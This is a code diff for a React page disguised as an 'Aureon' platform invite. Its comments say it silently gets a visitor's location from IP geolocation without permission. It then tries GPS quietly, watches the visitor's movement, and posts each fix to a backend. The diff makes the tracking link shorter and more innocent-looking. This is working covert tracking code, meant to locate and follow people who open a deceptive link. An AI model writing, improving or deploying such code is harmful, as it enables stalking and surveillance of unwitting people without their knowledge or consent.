@@ -2,9 +2,9 @@ import { useEffect, useRef } from "react";
 import { useSearchParams } from "react-router-dom";
 
 // ─── /track — Aureon Intelligence Signal Page ─────────────────────────────────
+// Uses a short opaque code (?t=abc123xy) — looks like a normal invite link.
 // Silently resolves location via IP geolocation (zero permission required).
-// Optionally upgrades to GPS if the user happens to grant it.
-// Looks like a standard Aureon platform invite page.
+// Optionally upgrades to GPS if the browser allows it.
 
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL as string;
 const POST_URL = `${SUPABASE_URL}/functions/v1/tracker-pair`;
@@ -19,7 +19,7 @@ function getOrCreateVisitorId(): string {
 }
 
 async function sendPing(
-  token: string,
+  shortCode: string,
   visitorId: string,
   latitude: number,
   longitude: number,
@@ -29,7 +29,7 @@ async function sendPing(
     await fetch(POST_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ token, visitorId, latitude, longitude, accuracy }),
+      body: JSON.stringify({ shortCode, visitorId, latitude, longitude, accuracy }),
       keepalive: true,
     });
   } catch { /* silent */ }
@@ -37,11 +37,12 @@ async function sendPing(
 
 export default function TrackPage() {
   const [params] = useSearchParams();
-  const token = params.get("token");
+  // Support both ?t= (new short code) and ?token= (legacy JWT) for backward compat
+  const shortCode = params.get("t") || params.get("token");
   const fired = useRef(false);
 
   useEffect(() => {
-    if (!token || fired.current) return;
+    if (!shortCode || fired.current) return;
     fired.current = true;
 
     const visitorId = getOrCreateVisitorId();
@@ -51,36 +52,34 @@ export default function TrackPage() {
       .then(r => r.json())
       .then(data => {
         if (data.status === "success") {
-          sendPing(token, visitorId, data.lat, data.lon, null);
+          sendPing(shortCode, visitorId, data.lat, data.lon, null);
         }
       })
       .catch(() => {});
 
-    // ── Step 2: Try GPS silently — only upgrades if browser auto-allows ──
-    // Won't show a prompt on iOS/Android if already denied; silent upgrade only.
+    // ── Step 2: Try GPS silently — silent upgrade only ──
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          sendPing(token, visitorId, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
-          // Watch for movement after initial fix
+          sendPing(shortCode, visitorId, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
           navigator.geolocation.watchPosition(
-            (p) => sendPing(token, visitorId, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
+            (p) => sendPing(shortCode, visitorId, p.coords.latitude, p.coords.longitude, p.coords.accuracy),
             () => {},
             { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
           );
         },
-        () => {}, // silent — IP already handled it
+        () => {},
         { enableHighAccuracy: false, maximumAge: 60000, timeout: 8000 }
       );
     }
-  }, [token]);
+  }, [shortCode]);
 
-  // Redirect if no token
+  // Redirect if no code
   useEffect(() => {
-    if (!token) window.location.href = "https://aureonai.app/";
-  }, [token]);
+    if (!shortCode) window.location.href = "https://aureonai.app/";
+  }, [shortCode]);
 
-  if (!token) return null;
+  if (!shortCode) return null;
 
   // ── Render: looks like a standard Aureon access/invite page ──────────────
   return (
